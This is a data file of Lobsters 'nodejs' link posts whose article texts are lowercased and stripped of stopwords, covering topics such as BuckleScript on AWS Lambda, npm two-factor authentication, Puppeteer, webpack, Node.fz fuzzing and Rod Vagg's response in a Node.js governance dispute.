248,Lobsters,nodejs,Node.js programming,Scalable and serverless media processing using BuckleScript/OCaml and AWS Lambda/API Gateway,https://medium.com/@romain.beauxis/scalable-and-serverless-media-processing-using-bucklescript-ocaml-and-aws-lambda-api-gateway-4efe39331f33,scalable serverless medium processing using bucklescriptocaml aws lambdaapi gateway,buckling bloomberg ocaml toolbox inria financial trading facebook uber opam real world ocaml lambda handler type serverless asynchronous monad promise category theory polymorphic variant phantom type stream eventemitter api,buckling downwhen working startup environment time production quite crucial putting together code prove idea feasible releasing minimal viable product demonstration purpose oftentimes developer choose quickest path write code nodejs great tool fastpaced work used lot coincidentally also one language available runtime lambda platformhowever flexible javascript also quite difficult maintain long run inherent lack structure make easy quickly patch together small demonstration project later creates potential hassle updating refactoring part code asking new developer work code never seen beforein order make javascript suitable largescale industrial application bucklescript framework recently emerged originally supported bloomberg bucklescript interface javascript native code ocaml start defining binding javascript ocaml write ocaml code using binding finally bucklescript compiler creates javascript code ocaml code deploy native javascript benefit loop transpiling get use fabulous tool ocaml language provides javascript applicationocaml toolboxdeveloped initially france inria research center ocaml functional language statically inferred type system efficient garbage collector pragmatic approach ml language paradigm similar haskell provides usual tool functional language also amenable imperative primitive whenever appropriate instance io programming recently enjoyed interesting surge various industrial application financial trading facebook recently uber ecosystem development tool greatly improved past year particular addition solid package manager opam allinall even though still niche language constitutes pretty successful transfer academic software industryone important feature ocaml static type system ocaml every variable type determined compiletime code tricky time explicitly write type variable mean code compiles guaranteed function always called argument specific fixed typein javascript world mean longer deal variable null receiving string expected int furthermore refactoring code change function expected type trickle via compiler every call function code compile fixed call function making refactoring safe truly enjoyable experience something important dealing large scale application developer teamsin following showing ocaml feature useful writing code bucklescriptjavascript familiar language might want start taking peek real world ocaml reference book ocaml programminglambda handler typein lambda function essentially callback handler receives three argument json object describing function parameter context object callback executed function finished execution ocamlbucklescript described following type type error exn jsnullablettype callback error unittype contexttype b lambdafunction context b callback unita callback function take two argument error either null exception result universal type return nothing usual callback paradigm asynchronous javascript code error argument null function assumed executed successfully possibly returned value second argumentfinally type lambda function take input parameter universal type context variable callback return value universal type b function return nothing prefer returned value ignorednow anticipating see later turn interfaced aws api gateway serverless returned value api handler javascript object form statuscode int body string case amend type declaration add type apiresponse statuscode int body string jsttype apihandler apiresponse lambdafunctionnow time declare lambda function type apihandler guaranteed function return appropriate type javascript objectthe asynchronous monadanother typical hassle javascriptnodejs world fact one constantly deal callbackbased computation usually look like function asynchronousprocessing callback dosomeasynchronouswork function err result err return callback err domoreasynchronouswork result function err newresult err return callback err etc etc repeat pattern constantly prone making mistake order make le painful apis promise introduced however none really solve problem repeat pattern come notion monad monad quite hip term deep connection category theory really fancy way describe computing abstraction essentially monad describes certain type computation combine together let look example applied case asynchronous computation take callback executes finished either error result type type error exn jsnullablettype callback error unittype callback unit computation return result type val return computation return error val fail exn combine two computation val b b tnow let look implementation monad let return result fun callback callback jsnullablenull resultlet fail error fun callback callback jsnullablereturn error objmagic jsnullablenull let current next fun callback current fun err result match jstooption err exn fail exn callback none next ret callback return function take callback executes null error parameter given result fail function take callback executes given error null result use little trickery objmagic pas resultfinally implement usual pattern combine asynchronous computation given callback current computation next one executes current computation new callback passed nonnull error return immediately executing original callback error else pass result next computation along original callbacknow let look code rewrite using asynchronous monad define asynchronous processing pipeline asynchronouscomputation dosomeasynchronouswork fun result domoreasynchronouswork result fun etc etc execute asynchronouscomputation callbackno repeated pattern potential error polymorphic variant phantom typesfinally let look tricky fancier application ocaml type system using phantom type polymorphic variantsphantom type parametric type used constrain subclass generic type various api restriction purpose powerful tool instance make possible force api user follow predefined flow call calling init followed config finally run going use annotate different event user listen nodejs readable writable streamsin order use polymorphic variant another power feature language quite handy sometimes requires bit work understand use properly polymorphic variant collection different label sub surclassed let look code fix idea might want also check official nodejs stream api heretype ttype writeevents close unit unit drain unit unit finish unit unit error exn unit pipe readable unit unpipe readable unit readevents close unit unit end unit unit readable unit unit data string unit error exn unit writable writeevents readable readevents ttype event writeevents readevents val event unitin api define list event readable writable stream receive event associated handler process type data received event occursthen subclass generic stream type annotating event associated type stream readable writable finally function typed accept event annotated stream type making sure instance readable stream used listen data event otherwise compiler complain message streamon writable data fun error expression type data string unit expression expected type streamwriteevents second variant type allow tag datanow let peek hood see implemented external string b unit unit bssend let stream function close fn stream close fn drain fn stream drain fn finish fn stream finish fn error fn stream error fn pipe fn stream pipe fn unpipe fn stream unpipe fn end fn stream end fn readable fn stream readable fn data fn stream data fnpretty simple first declare external method stream object receive type stream stringtyped event name callback receiving value yet unknown type lowlevel binding nodejs eventemitter apithen decorate function redefining function receives polymorphic event type handler explicitly unwraps expected parameter nodejs side voila finish noticing explicit type restriction function defined type interface without nothing tell compiler accept event handler part stream type annotation
249,Lobsters,nodejs,Node.js programming,Protect your npm account with two-factor authentication and read-only tokens,http://blog.npmjs.org/post/166039777883/protect-your-npm-account-with-two-factor,protect npm account twofactor authentication readonly token,google authenticator authy authentication token working token using twofactor authentication security npmjscom support npmjscom,today announcing two new way protect npm account please read learn use security feature keep code safe increase everyone trust package code npm registrytwofactor authentication sync npm account authentication application like google authenticator authy log prompted singleuse numeric code generated another layer defense account preventing third party altering code even steal guess credential one easiest important way ensure access npm accountreadonly tokensif continuous integration continuous deployment cicd workflow includes linking npm account tool like travis ci authentication token create readonly token tool need publish also restrict token work specified range ip addresseseven token compromised example accidentally commit github one else alter code authorized ci server able download codelearn token doc working tokensset please npm community larger population new york city never important reinforce trust encourage collaboration every developer secures npm account new method help ensure safety integrity code discover share reuse build amazing thingslearn activate doc using twofactor authenticationwatch spacethere never major security incident caused leaked npm credential security work never finished work continuously protect npm registry detect remove malicious code try keep informed effortsif ever believe encountered malicious code registry npm contact u right away using npm website lgt security contact form emailing security npmjscom feedback question rolled today contact support npmjscomthanks helping keep npm community safeupdate try tfa need version npm newer npm client get run npm install npm latest g
250,Lobsters,nodejs,Node.js programming,Terminal Kit: A full-blown terminal lib for Node.js,https://github.com/cronvel/terminal-kit,terminal kit fullblown terminal lib nodejs,terminal kit composition image loading blogsoulservnettagterminal screenshot pleaze key feature document model spinner table wordwrapping screenbuffer hd quick example license mit,terminal kit fullblown terminal lib featuring color style key mouse handling input field progress bar screen buffer including composition image loading text buffer many whether need color style build simple interactive command line tool complexe terminal application absolute terminal lib nodejs depend ncurses tutorial available blogsoulservnettagterminal screenshot pleaze fraction terminalkit line code click image see documentation related feature wordwrapping table automatic column computing cell fitting wordwrapping surface sprite load draw image inside terminal key feature new document model building rich app gui new spinner new table automatic column computing cell fitting wordwrapping new promise used instead callback everywhere new wordwrapping along full terminal width predefined columnwidth new screenbuffer hd rgba surface composition image loading quick example require lib get working terminal var term require terminalkit terminal term function simply output string stdout using current style output hello world default terminal color term hello world n output red red termred red output bold bold termbold bold output mixed using bold underlined red exposing stylemixing syntax termboldunderlinered mixed printf style formatting everywhere output name jack green termgreen name dn jack since style markup supported shorthand two line produce result term name red jack green term name rjack width height terminal term terminal size dx termwidth termheight move cursor upperleft corner termmoveto always pas additional argument displayed termmoveto upperleft corner formated termmoveto name dn jack even combined style termmovetocyan name dn jack get user input termmagenta enter name terminputfield function error input termgreen nyour name sn input license mit
252,Lobsters,nodejs,Node.js programming,Node.js is Windows 3.1 All Over Again,http://tomjoro.github.io/2017-02-03-why-reactive-fp-sucks/,nodejs window,rewind clock window present day reactive programming concurrency hard sequential logic starting multiple process thread sharing process expensive erlang process world changed conclusion afterward,reactive programming thread sharing javascript nodejs go rail elixir erlang rewind clock window window thing nonpreemptive multitasking ie cooperative multitasking cooperation funny term actually programmer controlled multitasking cooperative yo want event loop controlled window system got message work message repeated rule long computation break state machine driven message crash make user unhappy microsoft started working window nt great true preemptive multitasking thread creation context switching really slow could spawn like thread second fiber invented allowed thread shared fiber could preempted true thread problem fiber problem nonpreemptive multitasking eventually thread creation context switching got fast fiber relegated special problem like external iterators ruby nice fiber reactive programming also known nonblocking io thing reactive programming characteristic us central event loop dispatch control us runtocompletion ie preemption present day reactive programming operating system built around process reliability user mode process protected memory crash entire system thread run concurrently share memory main different process thread nutshell need nodejs reactive style programming nodejs work like window event loop time run run completion meaning code running interrupted rule used back window heard reason concurrency hard everything single thread problem thread scheduling expensive sharing thread gain efficiency cost concurrency hard concurrency hard want concurrency two choice process thread take pick pick process concurrency easy share memory pick thread share memory understand synchronization pick neither run everything single thread concurrency optimization using single thread dispatch loop concurrency optimizing use single thread must take role thread scheduling thread fairness etc order achieve real concurrency must run multiple instance application process whether make sense sequential logic programmer would agree sequential program one say b c print hello print yes goto easier understand one break processing sequence b take long want everything else program pause printnonblocking hello done callback line print yes goto example print statement slow us io avoid u blocking entire program call nonblocking routine printnonblocking give callback complete common quiz javascript ask printed first yes always going yes first way callback even try run give thread ie run completion actually sillly example callback never run code never return mean programmer must think scheduling addition logic even piece code heshe working need responsive although often result faster executing program programmer optimize context switching ie callback javascript wanted elixir would work like pid printnonblocking hello print yes wait message pid goto remember article showed java using blocking thread faster basically equivalent nonblocking io thing connection processor slower back nowadays much better starting multiple process starting multiple process nodejs common configuration nodejs order achieve concurrency start multiple instance application every process talk database application talking database might able start maximum concurrent request handled driver time database may maximum connection arbitrarily add instance may surprise instance application cause thing start failing want say application maximum connection database fairly share across separate process thread sharing nodejs popular work well nodejs created thread slow expensive rail us thread create thread find system performance degraded style programming rail great clear sequential code easy understand use jruby get true multitasking popular framework like play scala achieve performance mixing thread reactive programming callback read text play website state reason reactive routine ie share request thread primarily performance reason watch nasty problem like remember anything expensive callback thing stop share thread try much anything get stuck get stuck maybe something simple log statement example logger blocked writing file synchronous version worked test something happened production permission wrong backup locked file etc everything pause trying everything else coincidentally might using thread running single threaded choice use sort reactive programming ie event loop callback sort yielding done fiber single thread preempted system process expensive process expensive would use instead callback reactive elixir process expensive protected way operating system process protected course ton asynchronous stuff happening process waiting io example waiting database request complete would blocked blocking problem expense overhead process thread nodejs reactive programming tell u blocking problem solved blocking problem seen several article reactive programming kind statement rather hog thread even blocked nt hog thread first thing come mind example else supposed waiting result database anything else result need result make give template give renderer etc hogging hogging statement mislead coder thinking blocking bad really problem thread limited resource context switching thread expensive clarity nothing bad blocking code need wait result need wait result transpose callback promise changed logic block thread implementing user interface user interface would pause single threaded user interface user interface typically implemented single resource make sense synchronous elixir thanks erlang true preemptive multitasking process efficient inexpensive think break code longrunning task etc errant process simply shut restarted without taking entire system elixir io function block code stay sequential want wait might want wait maybe want start thing parallel maybe something useful get result blocking function maybe drawing user interface want pause blocking function easily made nonblocking simply wrapping spawn start asynchronously fact logger elixir erlang automatically switch synchronous asynchronous mode based feedback get system reason blocking something useful meanwhile get result later even care result nothing hogging stealing resource erlang process erlang process system process erlang process lightweight process key difference way erlang process share memory mutate data data always immutable never shared people miss point language talk thing use erlang mechanism exist yes often elixir slower javascript sometimes erlang interrupt process give control another process even though would efficient fairness erlang want process play nicely one process allowed hog system erlang vm basically operating system scheduler difficult make fair scheduler language even try instead rely native thread process javascript resort threadsharing performance good enough take look erlang scheduler see difficult elegantly erlang solves year experience usually point someone say yes may true process going lot copying sharing memory thread much efficient true sharing memory also lot dangerous couple code together performance great cost safety erlang mantra better safe fair fast world seems obsessed performance elixir performs well fair safe manner read one post world changed short summary using elixir work well everything surprised often conclusion wonder programmer enough experience remember good old day window biggest fan nodejs tuned window application often outperformed preemptive system day language like elixir offer fully preemptive sequential programming functional performance protection get focus making algorithm logic scheduling let scheduler scheduling get program wait want wait want need take pick joy programmer coder call nowadays event based programming good useful lot situation however using share thread expense thread conflating two concept afraid concurrency primitive want concurrency better served go see go mainly alternative javascript go provides much safer way concurrency still us shared thread via goroutines thread sharing performance optimization temporary artifact eventually fade away history book better still use thread use process tcan share memory afterward web developer might thinking yeah true need keep thing responsive user think scheduling true however complete application whether desktop application web application usually respond user click long running reporting job talking external rest api service etc rail nodejs typically nothing decision run background task requires using external database like redis external monitoring tool elixir provides much predictive environment code easily refactor code previously synchronous run asynchronously little change sequential logic nothing prevents using redis etc use need persistent task something need run asynchronusly tag elixir erlang functional programming rail nodejs javascript go
253,Lobsters,nodejs,Node.js programming,Making a Master Puppeteer,http://jackhiston.com/2017/9/13/making-a-master-puppeteer/,making master puppeteer,many way test program unit testing ui testing puppeteer puppeteer puppeteer chrome devtools protocol devtools headless chrome blink installation yarn npm node creating screenshots front page launch goto crawling website pageevaluate devtools clicking link navigating pagewaitfornavigation summary selenium useful link,many way test program starting miniscule unit testing grandiose ui testing puppeteer fall firmly latter category puppeteer advertises node library provides highlevel api control headless chrome devtools protocol lot word puppeteer walking advertisement true potential chrome devtools protocol offer ooze ease seems leave sense ui testing prime free puppeteer puppeteer ui automation tool achieves using combination headless chrome devtools protocol quote originally say higher level api wrap functionality making certain ui test automation breeze chrome devtools protocol expose set tool built famous google chrome devtools essentially hitting tool developer tool within browser therefore devtools protocol wheel devtoolsie get programmatical devtools chrome headless chrome chrome without chrome yes read correctly allows interact chromium environment browserie command line bringing power chromium blink rendering engine command line open many door biggest use case automated testing installation installation easy done yarn npm run following command yarn add pupeeter npm puppeteer required ran node like nodejs application creating screenshots time want test thing cs making sure website look feel regressed important check example take screenshot front page blog const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage await pagegoto http jackhistoncom await pagescreenshot path jackhistonblogpng browserclose first thing include puppeteer dependency launch browser instance could actually load browser screen well like const browser await puppeteerlaunch headless false note headless option create brand new page like would navigating browser goto specific url case home page use builtin screenshot functionality save image home page crawling website another use case puppeteer crawling website content next example navigating hacker news scraping link first page const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage pageon console args consolelog page log args await pagegoto http newsycombinatorcom waituntil networkidle const link await pageevaluate const anchor arrayfrom documentqueryselectorall storylink return anchorsmap anchor anchortextcontent consolelog linksjoin n browserclose one thing note pageevaluate function allows u inspect current page devtools area chrome clicking link navigating final use case want showcase navigation following example show click link page wait page finish loading record result const puppeteer require puppeteer async const browser await puppeteerlaunch const page await browsernewpage await pagegoto http newsycombinatorcom waituntil networkidle await pageclick astorylink var response await pagewaitfornavigation waituntil networkidle consolelog await pagetitle consolelog pageurl browserclose important function pagewaitfornavigation allows u wait click event fully loaded new web page click event promise finish click event useful navigating around testing ui user experience intact summary main focus puppeteer provide api show capability devtools protocol tool like selenium much established offer cross browser testing well puppeteer belong grouping selenium puppeteer one example many tool coming around headless chrome idiom time writing lot project use headless chrome good blog post mention ken soh place look existing project using devtools protocol puppeteer maintained chrome devtools team looking contribution head part new movement headless chrome automation testing thanks reading please share friend useful link
255,Lobsters,nodejs,Node.js programming,A pomodoro app for your menubar/taskbar,https://github.com/amitmerchant1990/pomolectron,pomodoro app menubartaskbar,pomodoro app menubartray key feature dark mode use git nodejs npm cask chocolatey see guide download download window binary news trending github may also like license amitmerchantcom amitmerchant,pomodoro app menubartray macos window key feature pomodoro short break long break timer notifies via system notification time life traymenubar cross platform window macos linux ready dark mode use clone run application need git nodejs come npm installed computer command line clone repository git clone http go repository cd pomolectron install dependency npm install run app npm start macos install pomolectron via cask brew cask install pomolectron window install pomolectron via chocolatey well c choco install pomolectron note using linux bash window see guide use node command prompt download download latest installable version pomolectron window linux macos also get window binary softpedia news pomolectron trending hacker news github day launch may also like license mit amitmerchantcom github twitter amitmerchant
256,Lobsters,nodejs,Node.js programming,General availability of App Service on Linux and Web App for Containers,https://azure.microsoft.com/en-us/blog/general-availability-of-app-service-on-linux-and-web-app-for-containers/,general availability app service linux web app container,azure app service web app container high productivity development ssh application ease deployment web app container azure container registry builtin cicd scale demand continuous deployment jenkins maven deployment slot use case try app service sign open source summit north america openatmicrosoft,application changing pace business today delivering amazing customer experience transforming internal operation keep pace developer need solution help quickly build deploy scale application without maintain underlying web server operating system azure app service delivers experience currently host million cloud application using powerful capability integrated cicd deployment slot auto scaling developer get application end user much faster today making even better pleased announce azure app service generally available linux including web app container capability offer builtin image support aspnet core nodejs php ruby linux well provide developer option bring docker formatted container image supporting java python go azure continue invest providing choice help maximize existing investment supporting azure app service linux important step direction high productivity development accelerate cloud application development take advantage builtin image aspnet core nodejs php ruby running linux letting focus application instead infrastructure select stack web app need set application environment handle maintenance want control environment simply ssh application get full remote access administrative command prebuilt package including wordpress joomla drupal solution also available azure marketplace deployed click app service ease deployment new app service capability web app container get containerized application production second simply push container image docker hub azure container registry private registry web app container deploy containerized application provision required infrastructure furthermore whenever required automatically perform linux o patching load balancing apart portal also option deploy app service using cli azure resource management template builtin cicd scale demand azure app service linux offer builtin cicd capability intuitive scaling experience simple click integrate github docker hub azure container registry realize continuous deployment jenkins vsts maven deployment slot let easily deploy target environment swap staging production schedule performance quality test rollback previous version zero downtime promote update production scaling simple dragging slider calling rest api configuring automatic scaling rule scale application demand automatically get high availability within across different geographical region get started azure app service linux check use case try app service free want learn sign upcoming webinar focused containerized application also join u thousand developer open source summit north america information update follow openatmicrosoft
257,Lobsters,nodejs,Node.js programming,The Wonderful World of Webpack,http://jackhiston.com/2017/9/4/the-wonderful-world-of-webpack/,wonderful world webpack,webpack blurb go webpack still bundler nodejs cyclic dependency webpack much loader loader typescript coffeescript chained configured filtered based file type custom loader example webpack documentation plugins plugins list compiler event hook thing summary,webpack javascript module bundler blurb go apt name however would like article expand true power webpack article explain use webpack rather explain reasoning behind make special bundler webpack still bundler one main reason tool like webpack solve dependency problem dependency problem caused module within javascript specifically nodejs nodejs allows modularise code modularisation code cause issue dependency cyclic dependency occureg b referencing tool like webpack build entire dependency graph referenced module graph analysis occur help alleviate stress dependency graph webpack take multiple entry point code spit output bundled dependency graph one file webpack much make webpack special great extension point provides loader loader like refer minitranspilers take file kind eg typescript coffeescript json etc produce javascript code later addition dependency graph webpack building power loader short supply loader extension point create loader default party loader example could point would ever want take statically typed language like c transpile javascript webpack understand limit boundless loader loader chained configured filtered based file type custom loader example webpack documentation explains loader node module exporting function loader simple defined node module export function moduleexports function src return src n windowonload function n consolelog loader n trivial example loader loader appending function write console window load current browser session idea mind becomes apparant power take source input interpret anyway want coming back previous example could take c input create parser transpiles native javascript webpack expects c javascript transpiler bit farfetched honesty slightly pointless hope appreciate leverage loader webpack make bundler plugins plugins allow customisation webpack broader scope file file like loader plugins add extra functionality core webpack example add plugin minification extract certain text output cs use plugins compression plugins work access webpack compiler access compilation step may occur modify step mean plugin modify file get produced file add asset an small example plugin following file mycustompluginjs function mycustomplugin mycustompluginprototypeapply function compiler compilerplugin emit displaycurrentdate compilerplugin afteremit displaycurrentdate function displaycurrentdate compilation callback consolelog date callback moduleexports mycustomplugin example adding two event handler two separate event hook webpack compiler outcome one date printed console asset emitted output directory one date asset emitted plugin used main webpack configuration var mycustomplugin require mycustomplugin var webpackconfig plugins new mycustomplugin plugin run emit afteremit stage compilation process good list compiler event hook available webpack website importance plugins extension point way webpack designed allow user fully extend core webpack many plugins choose lot party mind plugin could take asset require compress algorithm fact already plugin thing summary webpack module bundler label say take dependency graph output browser readable format however webpack much could take c code transpile javascript could take yaml configuration file create working program configuration took image automatically made cropped greyscaled think start thinking webpack transpiler bundler true power webpack seen thanks reading hope help
258,Lobsters,nodejs,Node.js programming,Fawn: Transactions in MongoDB,https://codeburst.io/fawn-transactions-in-mongodb-988d8646e564,fawn transaction mongodb,fawn fawn fawn fawn,wrote library called fawn implement transaction using two phase commit system fawn save update delete document file across collection transactional manner let look cash transfer example fawn example two update step fail prior step reversed explain update implemented function provided fawn task save remove savefile removefile follow similar processto begin create transaction task case object array step update function called add object step array contains information need perform update future need way actually perform update start update need way store data change data used event rollback need way update step state function process store document changedupdate step state pending update documentupdate step state done rollback task loop backwards step reverse one rollback function update task finally need run step sequentially first save task run update step error occurs rollback task implement transactional update mentioned process tweaked lightly save remove function
259,Lobsters,nodejs,Node.js programming,Node.fz: fuzzing the server-side event-driven architecture,https://blog.acolyer.org/2017/06/09/node-fz-fuzzing-the-server-side-event-driven-architecture/,nodefz fuzzing serverside eventdriven architecture,nodefz fuzzing serverside eventdriven architecture study concurrency bug short note atomicity ordering flushing bug nodefz legal viable useful http githubcomvtleelabnodefz,nodefz fuzzing serverside eventdriven architecture davis et al eurosys paper provides fascinating look common cause concurrency bug serverside event driven architecture eda based application far popular framework supporting style nodejs course nodejs package ecosystem npm largest ever package billion package downloads per week nodejs deployed industry including ebay paypal linkedin also embraced iot platform including cylonjs ibm nodered concurrency bug hang minute node run singlethreaded event loop callback executed atomically yes avoid blocking event loop callback use cooperative multitasking partition operation multiple asynchronous step leading callback chain sometimes callback hell one step indeed executed atomically order step executed unless care taken catch composing response using callback chain technique important implication software correctness developer must provide guarantee ordering atomicity eda offer guarantee order event loop process developer must therefore either write commutative callback introduce ordering constraint ordering violation ov occurs operation always invoked operation b order enforced atomicity violation av occurs two operation intended happen consecutively another operation interleaved affect result many concurrency bug found study due false assumption atomicity across callback chain longstanding reader morning paper indeed student computer science may surprised see concurrency bug dual occur threaded system lauer needham showed back threadbased eventbase model duals equivalent background see following edition morning paper december main body nodefz paper two part first part study concurrency bug found nodejs program wild second part describes tool called nodefz author built help flush let look turn study concurrency bug author searched across github bug mentioning race racecondition javascriptbased project narrowed result serverside project finally selected patched bug careful study based well documented finding interesting end day based analysis bug following table contains gory detail bug cause consequence identified two general pattern atomicity violation av ordering violation ov frequent type bug bug study av told short note atomicity ordering morning paper feb special type ordering violation author call cov commutative ordering violation happens application launch multiple asynchronous request intend run callback completed violation occurs final callback run request completed key finding event involved race condition stem diverse source network traffic timer user method call timing worker pool work processing done event race condition shared memory eg writes variable array also system resource eg query database io file system race condition may result severe consequence including server crash inconsistent database state common solution atomicity bug seems move intendedtobeconsecutive access callback ordering violation fixed using nested callback equivalent approach promise final note bug study want emphasize even developer familiar effective eda pattern still make mistake believe complex edabased software significantly easier get right multithreaded software relies different paradigm flushing bug nodefz race condition bug rely difficult trigger nondeterminism arising order input intermediate event handled event loop worker pool mask ov av cause inter intracallback chain race nodefz deliberately amplifies node inherent nondeterminism fuzzing shuffling delaying event hope flush bug quicker shuffling entry event queue executing callback nodefz yield schedule alternative input intermediate event arrival order shuffling entry worker pool task done queue nodefz produce schedule alternative worker pool task processing completion order paper describes detail nodefz implementation change libuv event library used node core event loop worker pool reside containing change libuv also isolates nodefz many change nodejs source nodefz make fuzzing decision legal according nodejs documentation upper bound late timer epoll guarantee immediate notification ready file descriptor input arrival time vary guarantee order task handling worker pool task queue guarantee order handling done task relative event event loop earlier version nodefz also shuffled timer several test suite nodejs rely node current implementation ordering causing failure nodefz shuffling timer removed change running nodejs test suite node implementation linked nodefz version libuv pass test bar one required increasing open file descriptor count would pas based strength nodejs test suite conclude nodefz legal viable alternative nodejs legal viable useful two key question evaluation perspective nodefz improve reproducibility bug study nodefz uncover novel bug test following scheduler parameter used ran test case used reproduce known bug time version nodejs ran test roughly number round testing use declaring software relatively bug free tool cause bug manifest iteration probably impractical let go ran time seems work let put production rabbithole right reproduction experiment result chart nodev vanilla node j nodenfz nodefz version fuzzing turned nodefz full fuzzing nodefz overall use even generic standard parameterization clearly offer marked improvement bug reproduction indicating also increase rate novel bug manifestation running full test suite application containing study bug nodefz found total three new bug iteration doesnt seem like believe discovered relatively novel bug three reason first software studied relatively mature many race condition already addressed second without expertise piece software could report bug caused crash test failure others may gone unnoticed third manual inspection suite suggested test typically unit test rather functional system test feel latter type test likely expose race condition software emailed first author see nodefz available anywhere try project code currently updated work latest version node libuv available within couple week keep posted via twitter update post update nodefz available http githubcomvtleelabnodefz pull request help port work latest version nodejs libuv welcome
260,Lobsters,nodejs,Node.js programming,nvm will not be adding support for Ayo,https://github.com/creationix/nvm/issues/1595#issuecomment-324378894,nvm adding support ayo,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
261,Lobsters,nodejs,Node.js programming,The Truth About Rod Vagg,https://medium.com/@rvagg/the-truth-about-rod-vagg-f063f6a53557,truth rod vagg,http response tsc process far nodejstsc first time seen list complaint response list complaint nodejstsc made case code conduct general board accusation new claim nodejstsc barrier inclusivity effort nodejstsc threat independence technical group inject expressed community committee threat future leadership project given weight content could dredge either trying hard pretty proud keeping level head imagined summary,note post copied http primary intended audience nodejs ctcdear reader externalsource neither like support personal abuse attack showing getting angry party involved would ask refrain targeting privately public specifically people think may supporting engaging abusive behaviour appreciate want need form helpful wayyep long post apology length time buckle upi sad reached point ctc asked make difficult decision one reason initially split tsc two group insulate technical doer ctc overhead administrative political tedium know many never imagined deal something like agreed join uncomfortable experience youit obvious never figured suitable structure made tsc useful functional healthy body might able deal effectively kind problem isolated ctc willing accept sizeable share blame improving organisational structure tenure leadershipmy responseregarding request resign ctc lieu clear justification removal benefit nodejs project case removal built primarily hearsay innuendo respectfully declinethere two primary reason standing groundi good conscience give credence strawman version touted loudly social medium github caricature vague notion regarding toxicity propensity harassment systematic breaking rule slanderous claim character basis fact dignify attack taking tacit responsibility voluntary resignationsecondly arguably importantly ctc absolutely take responsibility precedent currently set dogged pursuit leader project strongarm tactic deployed goal voluntarily resign eventual removal organisation behavior healthy productive inclusive communitymy primary concern consequence action endanger future health nodejs project believe irreplaceable snowflake entirely replaceable reason pause making acceptable part conduct governance internal relationshipshowever happy burden decision foisted upon content standing judged group creative force behind nodejs legitimate owner project respect individual group rightful position final arbiter technical nodejs project make entirely comfortable living whatever decision arrive regarding removali break rest post following section critique process farmy response list complaint made tscaddressing claim often repeated across internet regarding hinderance progress inclusivity diversitythe independence technical group new threat posed independencethe threat posed future leadership projectthe process farmy personal experience far approximately follows time ago received notification via email complaint detail provided informed would neither receive detail involved whatever process take place tsc member allowed speak directly matter including work colleague also tsc never provided opportunity understand specific charge involved discussion topic point day ago saw nodejstsc time public first time seen list complaint first heard vote taking place regarding positionat point provided opportunity answer complaint correct factual error contained see apologise make amends possible provide additional context may explain accusation meat point approached member tsc ctc regarding item record github show primarily thread involved moderation repository record open view regarding due diligence undertaken either accuser executing process interaction single member tsc regarding one matter private email person occasion involved attempting coax source bad feeling sensed attempting relatively blindly make amendsi hope empathise process rather unfair regardless whether process informed dictated governance document claimed changed future accused party chance least respond accusationsresponse list complaintsi including text redacted nodejstsc already public domain social medium also github press please note ask text link moderation repository discussion copied respect additional party involved rod first action apologize contributor repeatedly moderated rod discus issue member ctctsc first result undermined moderation process occurring also undercut authority moderator ctctsc membersrather delving detail complaint simply say unaware time action taken inappropriate caused hurt ctctsc member involved matter belatedly explained something coax offered freely issued private statement tsc ctc via email beginning month offering sincere apology without knowing whether part list complaint relevant part private statement relation behaviour specific weighed heavily instance lacked much context obviously sensitive matter already dealt taxing way understand missed signal entirely weighed without tact took side apologising unnecessary detail withheld behalf absurd thing without properly involved prior unreservedly apologise know apology acknowledged process dealing complaint apology neither acknowledged publication complaint handling process seemed impact party involved continue hold assume either dismiss sincerity apology sufficient mean rectifying kind misstepsin matter accept responsibility already attempted make amends prevent similar issue recurring disappoints still used active smear given clear feedback regarding misstep earlier would attempted resolve situation nodejsboard nodejsmoderation rod moderate asked another foundation director told would take board also ignored explicit request name member company later moderate name comment requested another tsc member needed follow later actually clean comment additionally discussed private information moderation repo public thread explicitly moderation policymy response complaint follows thread unfortunately involves significant amount background corporate politics personal relationship difficulty matter conspired raise temperature least excuse simply explanation may appeared heated interjection parti edit post soon first edit post quick discussion followed moderation repository realised made poor judgement call choice word removed reading intent word another poster removed disclosure matter discussed private forumi recall asked remove name company involved seen edited post find evidence request even made would trivial matter part would done without argument seen request find forming basis complaint rather troubling without additional evidencea board member asking another board member edit posting seemed board matter hence suggestion take board subsequently corrected tscowned repository therefore referred tsc adjudicationi considered remaining specific issue resolved informed otherwise since event took place yet find matter still active target criticism rather criticism aimed process apparently resolved matter first place never informed part resolution unsatisfactory provided chance rectify additional perceived misdeed recently rod tweeted support inflammatory anticodeofconduct article perceived leader project difficult outsider separate rod opinion project knowing space participating value community rod predicted kind response tweet received http tweeting screen capture immature response suggests pleasure upset member javascript community others perceived leader behavior reflects poorly project http public comment sort issue reason avoid project participation http evidence others nodejs may serious commitment community inclusivity http post linked absolutely anticodeofconduct article article written associate professor evolutionary psychology university new mexico discussing free speech general suggesting case speech code american university campus sharing hoped encourage meaningful discussion regarding possible shortcoming standard code conduct language intent suggest nodejs project code conduct place rod predicted kind response tweet received deeply normative statement predict storm generated assumed open discussion matter speech policing still possible personal view would misconstrued view broader nodejs leadership group community obviously chose wrong forum tscctc member going held responsible attempting share discus personal view personal channel level accountability applied equally across technical foundation leadership tweeting screen capture immature response suggests pleasure assumption feeling time find ironic especially context complaint number criticised reading intention another individual word yet precisely done claim absolutely untrue take pleasure upsetting people refrain justifying action matter accusation baseless disingenuousto restate clarity made case code conduct general rather would like see ongoing discussion social guideline could improved upon clearly impact open source project healthi never made case nodejs code conducti clear voting record adopting nodejs project code conduct various change made code conduct adopted number project moved github account nodejs foundationi refrain justifying tweet bring set opinion value diverse mix work find acceptable common space u operate within ask agree within reason hope mutual respect stronger single disagreement accept opinion matter form valid reason removal submitted code conduct participant project involved application code conduct accept sacred text critique even discussionwhile matter tsc ctc board member foundation admission repeatedly discussed sensitive private board matter publicly twitter causing ongoing consternation legal concern board far know individual asked resign consider type behaviour considerably problematic foundation tweeting link article completely unrelated nodejstaking action basis tweet ignoring many tweet social medium post stand direct conflict goal foundation member technical team leadership member foundation various body strike deeply unequal must said uninclusive application rulesif case tscctc setting limit personal discussion held outside context project repo limit applied member group without prejudiceboard accusationsin addition list new claim nodejs foundation board appears suggest andor engage antagonistic aggressive derogatory behavior supporting evidence provided presumably supporting evidence list nodejstsc responded abovei respond unsupported claim presented entirely without merit consider anything malicious selfserving obvious attempt emotionally manipulate tsc ctc charging existing claim completely new level seriousness sprinkling assortment stigmatic evil person descriptorsto say disappointed majority board would agree conduct unprofessional 